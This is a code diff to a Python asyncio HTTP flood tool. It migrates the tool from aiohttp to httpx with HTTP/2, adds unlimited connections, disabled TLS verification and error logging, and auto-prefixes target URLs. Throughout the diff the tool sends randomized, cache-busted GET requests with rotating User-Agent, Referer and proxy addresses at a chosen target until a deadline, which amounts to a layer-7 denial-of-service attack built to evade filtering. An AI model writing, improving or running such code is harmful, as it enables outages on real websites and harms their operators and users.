@@ -13,6 +13,7 @@ import asyncio
 import os
 import random
 import socket
+import ssl
 import string
 import sys
 import time
@@ -20,6 +21,7 @@ from pathlib import Path
 from urllib.parse import urlparse, urlencode, urlunparse, parse_qsl
 
 import aiohttp
+import httpx
 from aiohttp_socks import ProxyConnector
 
 
@@ -61,7 +63,6 @@ def build_headers() -> dict:
         "User-Agent": random.choice(UA_POOL),
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "Accept-Language": random.choice(ACCEPT_LANGS),
-        "Accept-Encoding": "gzip, deflate, br",
         "Referer": random.choice(REFERERS),
         "Connection": "keep-alive",
         "Upgrade-Insecure-Requests": "1",
@@ -120,10 +121,21 @@ class Runner:
         self.failed = 0
         self._stop = False
         self._lock = asyncio.Lock()
-        self._sessions: dict[str, aiohttp.ClientSession] = {}
-        self._connectors: dict[str, ProxyConnector] = {}
+        self._sessions: dict[str, httpx.AsyncClient] = {}
+        self._errors_seen = 0
         self._last_report = time.time()
         self._last_sent = 0
+
+        use_http2 = url.startswith("https://")
+        limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
+        timeout = httpx.Timeout(6.0, connect=6.0)
+        self._default_kwargs = {
+            "http2": use_http2,
+            "verify": False,
+            "follow_redirects": False,
+            "limits": limits,
+            "timeout": timeout,
+        }
 
     def _bust(self) -> str:
         p = urlparse(self.url)
@@ -131,28 +143,18 @@ class Runner:
         q.append(("_", rand_token(8)))
         return urlunparse(p._replace(query=urlencode(q)))
 
-    async def _client_for(self, proxy_url: str | None):
+    def _client_for(self, proxy_url: str | None) -> httpx.AsyncClient:
         key = proxy_url or "__direct__"
-        sess = self._sessions.get(key)
-        if sess and not sess.closed:
-            return sess
+        client = self._sessions.get(key)
+        if client is not None:
+            return client
 
+        kwargs = dict(self._default_kwargs)
         if proxy_url:
-            conn = self._connectors.get(proxy_url)
-            if conn is None:
-                conn = ProxyConnector.from_url(proxy_url, rdns=True, limit=0, limit_per_host=0)
-                self._connectors[proxy_url] = conn
-        else:
-            conn = aiohttp.TCPConnector(limit=0, limit_per_host=0)
-
-        sess = aiohttp.ClientSession(
-            connector=conn,
-            timeout=aiohttp.ClientTimeout(total=6),
-            auto_decompress=False,
-            skip_auto_headers={"Accept-Encoding"},
-        )
-        self._sessions[key] = sess
-        return sess
+            kwargs["proxy"] = proxy_url
+        client = httpx.AsyncClient(**kwargs)
+        self._sessions[key] = client
+        return client
 
     async def fire(self):
         if self.ring is not None:
@@ -165,20 +167,23 @@ class Runner:
 
         url = self._bust()
         headers = build_headers()
-        sess = await self._client_for(proxy_url)
+        client = self._client_for(proxy_url)
 
         try:
-            async with sess.get(url, headers=headers, allow_redirects=False) as r:
-                await r.read()
+            r = await client.get(url, headers=headers)
+            self._ = r.status_code
             if proxy_url:
                 await self.ring.ok(proxy_url)
             async with self._lock:
                 self.sent += 1
-        except Exception:
+        except Exception as e:
             if proxy_url:
                 await self.ring.fail(proxy_url)
             async with self._lock:
                 self.failed += 1
+                if self._errors_seen < 5:
+                    self._errors_seen += 1
+                    print(f"  err[{type(e).__name__}]: {str(e)[:120]}")
 
     async def worker(self, deadline: float):
         while time.time() < deadline and not self._stop:
@@ -220,11 +225,11 @@ class Runner:
         self._stop = True
         rep.cancel()
 
-        for s in self._sessions.values():
-            if not s.closed:
-                await s.close()
-        for c in self._connectors.values():
-            await c.close()
+        for c in self._sessions.values():
+            try:
+                await c.aclose()
+            except Exception:
+                pass
 
         return {"sent": self.sent, "failed": self.failed}
 
@@ -240,6 +245,9 @@ def gather_inputs() -> dict:
     if not target:
         print("no target, exiting")
         sys.exit(1)
+
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
 
     proxy_env = os.environ.get("AASHU_PROXIES")
     if proxy_env is not None:
